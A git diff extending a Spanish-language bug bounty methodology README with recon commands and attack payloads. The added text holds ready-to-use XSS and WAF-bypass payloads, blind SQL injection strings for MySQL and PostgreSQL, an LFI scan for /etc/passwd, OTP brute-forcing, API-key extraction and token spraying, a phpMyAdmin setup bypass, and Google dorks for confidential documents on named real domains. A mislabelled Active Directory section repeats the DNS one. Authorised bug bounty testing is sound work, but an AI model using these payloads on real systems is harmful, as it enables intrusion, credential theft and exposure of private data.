@@ -2,6 +2,10 @@
 
 `Bug Bounty Methodology` este documento sirve para tener una metodología a la hora de hacer bug bounty en programas BBP (bug bounty program) o VDP (vulnerability disclosure program). Donde encontraras comandos para ayudarte rapidamente a realizar bug bounty desde lo mas básico a lo avanzado.
 
+### 1.0. Enumerar de forma pasiva todos los puntos finales de un sitio web.
+   - ```bash 
+      echo ejemplo.com | katana -passive -f qurl -pss waybackarchive,commoncrawl,alienvault | httpx -mc 200 | grep -E '\.(js|php)$' | tee specificEndpoints
+      ```   
 ### 1.1. Encontrar todos subdominios con subfinder de un dominio principal
    - ```bash 
       subfinder -d viator.com -all  -recursive > subdomain.txt
@@ -68,8 +72,27 @@
    - ```bash 
       cat allurls.txt | gf redirect | openredirex -p /home/paulportanc/openRedirect
       ```
-
-
+#### 1.16. HTTPX. 
+   - Utilizar **Httpx** para encontrar **LFI**. Este comando que le mostrará todas las urls vulnerables lfi en la pantalla, básicamente etc/passwd archivo de contraseña en la respuesta y mostrar todas las urls en la pantalla.
+   - ```bash
+      echo 'https://ejemplo.com/index.php?page=' | httpx-toolkit -paths payloads/lfi.txt -threads 50 -random-agent -mc 200 -mr "root:(x|\|\$[^\:]):0:0:"
+      ```
+#### 1.17. WFUZZ. 
+   - Utilizar **wfuzz** para fuerza bruta.
+   - ```bash
+      wfuzz -d '{"email":"hapihacker@email.com", "otp":"FUZZ","password":"NewPassword1"}' -H 'Content-Type: application/json' -z file,/usr/share/wordlists/SecLists-master/Fuzzing/4-digits-0000-9999.txt -u http://crapi.apisec.ai/identity/api/auth/v2/check-otp --hc 500
+      ```
+#### 1.18. SHODAN. 
+   - Obtener todas las IPs de Shodan sin ninguna cuenta premium. Una vez estando en Shodan en Facet Analysis, precionar F12 e ir a Console y escribir: **allow pasting**. Copiar el siguiente código
+   - ```bash
+      var ipElements=document.querySelectorAll('strong');var ips=[];ipElements.forEach(function(e){ips.push(e.innerHTML.replace(/["']/g,''))});var ipsString=ips.join('\n');var a=document.createElement('a');a.href='data:text/plain;charset=utf-8,'+encodeURIComponent(ipsString);a.download='shodanips.txt';document.body.appendChild(a);a.click();
+      ```
+#### 1.19. APIs. 
+   - Enumerar la superficie de ataque, obtener API KEYS y puntos finales de API en Móviles. Descarga el .apk usando APKCombo o APKPure. Escaneo de archivos APK en busca de URI, puntos finales y secrets. Validar API KEY encontrada con nuclei
+   - ```bash
+      apkleaks -f com.EJEMPLO.COM.apk -o output_endpoints_apikeys
+      nuclei -t nuclei-templates/http/token-spray -var token=<API_KEY_FOUND>
+      ```
 
 -------------------------------------------------------------------------------------------------
 
@@ -111,8 +134,17 @@
       [?] Enter the path to the payloads file: payloads/xss.txt
       Enter the timeout duration for each request (Press Enter for 0.5): "Presionar enter"
      ```
-
-     
+### 2.3. XSS Reflejado.
+   - XXS reflejado con zero click en un '<'input'>' vulnerable
+     ```bash 
+      hola" " onfocus="alert(document.domain)" autofocus="
+     ```
+### 2.4. XSS Almacenado.
+   - Crea un fichero en linux y luego sube ese archivo a través de un cargador, tendrás un XSS almacenado si el nombre del archivo está almacenado y el desarrollador se ha olvidado de desinfectar este campo.
+     ```bash 
+      touch '"><img src=x onerror=alert("xss!")>.pdf'
+     ```
+           
 -------------------------------------------------------------------------------------------------
 
 
@@ -281,6 +313,28 @@
    ```bash
    https://otx.alienvault.com/api/v1/indicators/hostname/example.com/url_list?limit=500&page=1 
    ```
+6. Otras opciones 1: **Katana**. Para encontrar documentos confidenciales, sensibles y a datos de PII.
+   ```bash
+   katana -u subdomainsList -em pdf,docx | tee endpointsPDF_DOC
+   grep -i 'redacted.*\.pdf$' endpointsPDF_DOC | sed -E 's/[-_]?redacted//gi' | sort -u | httpx -mc 200 -sc
+   ```
+7. Otras opciones 2: **Gau**. Encontrar información Divulgación (***Information Disclosure***): Expresión regular..
+   ```bash
+   echo https://sksc.somaiya.edu | gau | grep -E "\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|tar\.gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yml|gz|config|csv|yaml|md|md5|tar|xz|7zip|p12|pem|key|crt|csr|sh|pl|py|java|class|jar|war|ear|sqlitedb|sqlite3|dbf|db3|accdb|mdb|sqlcipher|gitignore|env|ini|conf|properties|plist|cfg)$"
+
+   echo https://sksc.somaiya.edu | gau | grep -E "\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5"
+   ```
+8. Otras opciones 3: **Google Dorks**.
+   - Para encontrar datos de PII o información reservada para los procesos de negocio
+   ```bash
+   site:*.EJEMPLO.COM (ext:doc OR ext:docx OR ext:pdf OR ext:rtf OR ext:ppt OR ext:csv OR ext:xls) (intext:confidential OR intext:privileged OR intext:unredacted OR intext:secret OR intext:reserved)
+   ```
+   - Para encontrar errores en SQLi.
+   ```bash
+   site:testphp.vulnweb.com intext:"sql syntax near" OR intext:"syntax error" OR intext:"unexpected end of SQL" OR intext:"Warning: mysql_" OR intext:"pg_connect()" OR intext:"error in your SQL syntax" OR intext:"OLE DB Provider for SQL Server"
+
+   site:*.dell.com (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)
+   ```
    
 ### Remediación.
 Cuando una empresa descubre que los usuarios están accediendo a versiones antiguas o archivadas de su sitio web a través de plataformas como Wayback Machine (web.archive.org), puede tomar varias medidas para prevenir o mitigar esta situación. Así es como las empresas pueden solucionar o abordar este problema:
@@ -411,22 +465,78 @@ Si la empresa cree que existe una infracción o explotación grave, puede escala
      cat openredirect | gf redirect 
       ```
 
+-------------------------------------------------------------------------------------------------
+
+
+# ***VII. WAF***
+
+### 7.1. ***FFUZ***. comando para evitar WAFs y obtener buenos resultados en errores de divulgación de información.
+   - ```bash 
+      ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://example.com/FUZZ -fc 400,401,402,403,404,429,500,501,502,503 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env,.asp,.aspx,.jsp,.gz,.tar,.sql,.db -ac -c -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" -H "X-Forwarded-For: 127.0.0.1" -H "X-Originating-IP: 127.0.0.1" -H "X-Forwarded-Host: localhost" -t 100 -r -o results.json
+      ```
+### 7.2. ***XSS bypass WAF***.
+   - ```bash 
+      "><img/src=%20only=1%20OnErRor=x=alert`XSS`><!--
+      "><details/open/id="&XSS"ontoggle​=alert("XSS_WAF_BYPASS_:-)")>
+      "><form onformdata%3Dwindow.confirm(cookie)><button>XSS here<!--
+      1'"();<test><ScRiPt >window.alert("XSS_WAF_BYPASS")</ScRiPt>
+      "><input%0a%0atype="hidden"%0a%0aoncontentvisibilityautostatechange=confirm(/paulportanc/)%0d%0astyle=content-visibility:auto>
+      "><input type="hidden" oncontentvisibilityautostatechange="confirm(/Bypassed/)" style="content-visibility:auto">
+      <p oncontentvisibilityautostatechange="alert(/FirefoxOnly/)" style="content-visibility:auto">
+      ```
 
 
 -------------------------------------------------------------------------------------------------
 
 
-# ***VII. Plantillas Nuclei***
+# ***VIII. Bases de Datos***
 
-### 6.1. ***Open Redirect***. Es una vulnerabilidad en la que una aplicación web redirecciona de forma incorrecta a los usuarios a sitios que no son de confianza, lo que permite a los atacantes redirigir a las víctimas a sitios web maliciosos o de phishing.
+### 8.1. ***PHPMYADMIN***. Si encuentra alguna página phpmyadmin, simplemente omítala con la página de configuración de instalación Ejemplo: https://www.ejmplo.com/phpmyadmin/. Omisión pegar ***/setup/index.php/setup/index.php?page=servers&mods=test&id=test*** después de phpmyadmin/ La mayoría de las veces, debido a una mala configuración de seguridad, se abre la página de configuración principal, así que simplemente repórtelo al programa de recompensas y gane una buena cantidad de recompensa 
+   - ```bash 
+      https://www.ejemplo.com/media/phpmyadmin/setup/index.php/setup/index.php?page=servers&mods=test&id=test
+      ```
+### 8.2. ***SQL Injection***. Buscará directamente todos los subdominios basados ​​en **php**, **asp**, **jsp**, **jspx**, **aspx**. 
+   - ```bash 
+      subfinder -dL subdomains.txt -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'
+      subfinder -d ejemplo.com -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'
+      ```
+   - Ejemplo: En el campo email_user='+||+(1)=(1)+LiMiT+1--+-$pwd=123
+   - ```bash 
+      '+||+(1)=(1)+LiMiT+1--+-
+      ```
+   - Ejemplo: GET http:....../order=nombre&sort=-1+OR+IF(MID(version(),1,5)='5.7.2',BENCHMARK(900000,SHA1(1)),1)--
+   - ```bash 
+      -1+OR+IF(MID(version(),1,5)='5.7.2',BENCHMARK(900000,SHA1(1)),1)--
+      ```   
+### 8.3. ***SQL Injection Blind MYSQL***.  
+   - Ejemplo: En la cabecera GET
+   - ```bash 
+      -1+OR+IF(1%3d1,+(SELECT+1+FROM+(SELECT+SLEEP(MID(version(),1)))+AS+v),+0)
+      ```
+   - Ejemplo: search='OR+(SELECT+1+FROM+(SELECT(SLEEP(MID(version(),1,1))))test)+OR+'.test'='.test
+   - ```bash 
+      'OR+(SELECT+1+FROM+(SELECT(SLEEP(MID(version(),1,1))))test)+OR+'.test'='.test
+      ```   
+### 8.4. ***SQL Injection Blind PostgreSQL***.  
+   - Ejemplo: GET /pagina.php?valor=(SELECT+1+FROM+pg_sleep((ASCII((SELECT+datname+FROM+pg_database+LIMIT+1))+-+32)+/+2))
+   - ```bash 
+      (SELECT+1+FROM+pg_sleep((ASCII((SELECT+datname+FROM+pg_database+LIMIT+1))+-+32)+/+2))
+      ```
+   
+-------------------------------------------------------------------------------------------------
+
+
+# ***IX. Plantillas Nuclei***
+
+### 9.1. ***Open Redirect***. Es una vulnerabilidad en la que una aplicación web redirecciona de forma incorrecta a los usuarios a sitios que no son de confianza, lo que permite a los atacantes redirigir a las víctimas a sitios web maliciosos o de phishing.
    - ```bash 
       cat dominios.txt | nuclei -t /home/paulportanc/prsnl/openRedirect.yaml --retries 2
       ```
-### 6.2. ***WP-Setup Disclosure***. Esta plantilla ayuda a identificar el archivo wp-admin/setup-config.php que puede exponer información confidencial, como credenciales. Suele clasificarse como una vulnerabilidad P1 en los programas de recompensas por errores.
+### 9.2. ***WP-Setup Disclosure***. Esta plantilla ayuda a identificar el archivo wp-admin/setup-config.php que puede exponer información confidencial, como credenciales. Suele clasificarse como una vulnerabilidad P1 en los programas de recompensas por errores.
    - ```bash 
       cat dominios.txt | nuclei -t /home/paulportanc/prsnl/wp-setup-config.yaml
       ```
-### 6.3. ***Microsoft IIS Scanner***. La explotación de esta vulnerabilidad puede filtrar archivos que contienen información confidencial, como credenciales, archivos de configuración, scripts de mantenimiento y otros datos.
+### 9.3. ***Microsoft IIS Scanner***. La explotación de esta vulnerabilidad puede filtrar archivos que contienen información confidencial, como credenciales, archivos de configuración, scripts de mantenimiento y otros datos.
    - ```bash 
       cat dominios.txt | nuclei -t /home/paulportanc/prsnl/iis.yaml -c 30
       ```
@@ -434,13 +544,13 @@ Si la empresa cree que existe una infracción o explotación grave, puede escala
    - ```bash 
       shortscan https://dominio.com -F
       ```
-### 6.4. ***Git Exposure***. La vulnerabilidad de exposición de .git ocurre cuando un directorio .git de un repositorio de Git o archivos de configuración se exponen accidentalmente a la red pública de Internet debido a servidores web mal configurados. Esto puede filtrar información confidencial, como el código fuente, el historial de confirmaciones y las credenciales, que los atacantes podrían aprovechar para obtener acceso no autorizado o identificar vulnerabilidades en el sistema.
+### 9.4. ***Git Exposure***. La vulnerabilidad de exposición de .git ocurre cuando un directorio .git de un repositorio de Git o archivos de configuración se exponen accidentalmente a la red pública de Internet debido a servidores web mal configurados. Esto puede filtrar información confidencial, como el código fuente, el historial de confirmaciones y las credenciales, que los atacantes podrían aprovechar para obtener acceso no autorizado o identificar vulnerabilidades en el sistema.
    - ```bash 
       cat dominios.txt | nuclei -t /home/paulportanc/prsnl/gitExposed.yaml  
       ```
      A continuación, puede utilizar la herramienta Git Dumper para recuperar confirmaciones eliminadas y extraer detalles adicionales del repositorio Git.
      
-### 6.5. ***CORS Misconfiguration***. La vulnerabilidad CORS (Cross-Origin Resource Sharing - intercambio de recursos de origen cruzado) se produce cuando una aplicación web permite de forma indebida solicitudes de dominios no confiables, lo que permite a los atacantes acceder a datos confidenciales o realizar acciones no autorizadas en nombre de los usuarios. Esto puede suceder si la configuración de CORS es demasiado permisiva y permite que sitios web maliciosos interactúen con la aplicación..
+### 9.5. ***CORS Misconfiguration***. La vulnerabilidad CORS (Cross-Origin Resource Sharing - intercambio de recursos de origen cruzado) se produce cuando una aplicación web permite de forma indebida solicitudes de dominios no confiables, lo que permite a los atacantes acceder a datos confidenciales o realizar acciones no autorizadas en nombre de los usuarios. Esto puede suceder si la configuración de CORS es demasiado permisiva y permite que sitios web maliciosos interactúen con la aplicación..
    - ```bash 
       cat dominios.txt | nuclei -t /home/paulportanc/prsnl/cors.yaml  
       ```
@@ -451,11 +561,11 @@ Si la empresa cree que existe una infracción o explotación grave, puede escala
    - ```bash 
       curl -H 'Origin: http://ejemplo.com' -I https://dominio.com/wp-json/  
       ```
-### 6.6. ***Crendential Disclosure***. La divulgación de credenciales es la exposición de información confidencial, como contraseñas o claves API, a menudo debido a un almacenamiento o controles de acceso deficientes que conducen a un acceso no autorizado.
+### 9.6. ***Crendential Disclosure***. La divulgación de credenciales es la exposición de información confidencial, como contraseñas o claves API, a menudo debido a un almacenamiento o controles de acceso deficientes que conducen a un acceso no autorizado.
    - ```bash 
       cat dominios.txt | nuclei -t  /home/paulportanc/prsnl/credentials-disclosure-all.yaml -c 30  
       ```
-### 6.7. ***Blind SSRF***. La SSRF ciega se produce cuando un atacante engaña a un servidor para que realice solicitudes a sistemas internos sin ver la respuesta. El atacante infiere que el ataque tuvo éxito basándose en pistas indirectas, como el tiempo o los errores. Es riesgoso, ya que puede exponer recursos internos.
+### 9.7. ***Blind SSRF***. La SSRF ciega se produce cuando un atacante engaña a un servidor para que realice solicitudes a sistemas internos sin ver la respuesta. El atacante infiere que el ataque tuvo éxito basándose en pistas indirectas, como el tiempo o los errores. Es riesgoso, ya que puede exponer recursos internos.
    - ```bash 
       cat dominios.txt | nuclei -t /home/paulportanc/prsnl/blind-ssrf.yaml -c 30 -dast  
       ```
@@ -463,23 +573,57 @@ Si la empresa cree que existe una infracción o explotación grave, puede escala
    - ```bash 
       cat dominios.txt | nuclei -t /home/paulportanc/prsnl/response-ssrf.yaml --retries 2 --dast
       ```
-### 6.8. ***SQL injection***. La inyección SQL es un tipo de ataque en el que un atacante inserta un código SQL malicioso en una consulta, lo que le permite manipular o acceder a una base de datos de manera no autorizada. Esta plantilla ayudará a detectar la inyección SQL basada en errores.
+### 9.8. ***SQL injection***. La inyección SQL es un tipo de ataque en el que un atacante inserta un código SQL malicioso en una consulta, lo que le permite manipular o acceder a una base de datos de manera no autorizada. Esta plantilla ayudará a detectar la inyección SQL basada en errores.
    - ```bash 
       cat domains.txt | nuclei -t /home/paulportanc/prsnl/errorsqli.yaml -dast  
       ```
-### 6.9. ***Swagger-Ui XSS***. Swagger XSS ocurre cuando un atacante inyecta scripts maliciosos en Swagger UI, una herramienta para la documentación de API. Esto puede provocar acciones no autorizadas, robo de datos o desfiguración de la interfaz de la API que afecten a los usuarios que interactúan con ella.
+### 9.9. ***Swagger-Ui XSS***. Swagger XSS ocurre cuando un atacante inyecta scripts maliciosos en Swagger UI, una herramienta para la documentación de API. Esto puede provocar acciones no autorizadas, robo de datos o desfiguración de la interfaz de la API que afecten a los usuarios que interactúan con ella.
    - ```bash 
       subfinder -d dominio.txt -all -slent | httpx-toolkit -path /swagger-api/ -sc -content-length -mc 200 
       ```
-### 6.10. ***CRLF injection***. La inyección CRLF es cuando un atacante inserta caracteres de nueva línea maliciosos en campos de entrada, lo que potencialmente le permite manipular encabezados, crear divisiones de respuestas HTTP o inyectar contenido malicioso en aplicaciones web. Después de encontrar esto, puede confirmar la vulnerabilidad utilizando Burp Suite o simplemente usando el comando CURL.
+### 9.10. ***CRLF injection***. La inyección CRLF es cuando un atacante inserta caracteres de nueva línea maliciosos en campos de entrada, lo que potencialmente le permite manipular encabezados, crear divisiones de respuestas HTTP o inyectar contenido malicioso en aplicaciones web. Después de encontrar esto, puede confirmar la vulnerabilidad utilizando Burp Suite o simplemente usando el comando CURL.
 
    - ```bash 
       cat dominios.txt | nuclei -t /home/paulportanc/prsnl/cRlf.yaml -rl 50 -c 30 
       ```
+### 9.11. ***Phishing***. Detectar sitios web de phishing.
 
+   - ```bash 
+      nuclei -l websites_Possible_Phishing -tags phishing -itags phishing
+      ```
+### 9.12. ***WordPress***. Plantilla para wordpress de divulgación que contiene información tan senstive que cuentan como P1. Sólo tiene que ejecutar esta plantilla en todos los subdominios bbp (bug bounty program). El template **wp-setup-config.yaml** se encuentra en el repositorio..
 
-      
+   - ```bash 
+      echo 'https://speedtest.ejemplo.com/' | nuclei -t nuclei-template/wp-setup-config.yaml
+      subfinder -d example.com -all | httpx-toolkit | nuclei -t nuclei-template/wp-setup-config.yaml
+      ```
+### 9.13. ***AWS***. Detectar configuraciones incorrectas y vulnerabilidades en nube (especificamente en AWS, detecta buckets de S3 e instancias EC2 mal configurados). Y Control de un bucket de S3
+
+   - ```bash 
+      nuclei -config ~/nuclei-templates/profiles/aws-cloud-config.yml -s critical,high --silent
+      echo EJEMPLO.COM | cariddi | grep js | tee js_files | httpx -mc 200 | nuclei -tags aws,amazon
+      ```
 -------------------------------------------------------------------------------------------------
+
+# ***X. DNS***
+
+### 10.1. ***PureDNS***. Resolver/forzar mediante DNS.
+   - ```bash 
+      puredns bruteforce best-dns-wordlist.txt dominio.com -r resolvers.txt -w dns | httpx -mc 200 -o subdomain_output.txt 
+      ```
+     
+-------------------------------------------------------------------------------------------------
+
+# ***XI. ACTIVE DIRECTORY***
+
+### 10.1. ***PureDNS***. Resolver/forzar mediante DNS.
+   - ```bash 
+      puredns bruteforce best-dns-wordlist.txt dominio.com -r resolvers.txt -w dns | httpx -mc 200 -o subdomain_output.txt 
+      ```
+     
+-------------------------------------------------------------------------------------------------
+
+
 
 # ***Extensiones para Bug Hunting***
    
